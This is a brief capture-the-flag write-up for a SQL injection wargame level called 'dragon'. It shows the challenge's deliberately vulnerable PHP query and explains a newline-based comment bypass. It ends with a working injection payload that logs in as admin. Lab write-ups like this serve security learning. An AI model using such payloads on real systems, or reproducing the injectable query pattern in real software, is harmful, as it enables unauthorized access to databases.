# dragon

```php
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  $query = "select id from prob_dragon where id='guest'# and pw='{$_GET[pw]}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
  if($result['id'] == 'admin') solve("dragon");
  highlight_file(__FILE__); 
?>
```

Here the rest of the query is commented out. So we have to escape the comments. then we have to give `or id='admin'` but for that to work we need to make the first condition false. So the final payload is

```php
%0A and 1=0 or id='admin
```
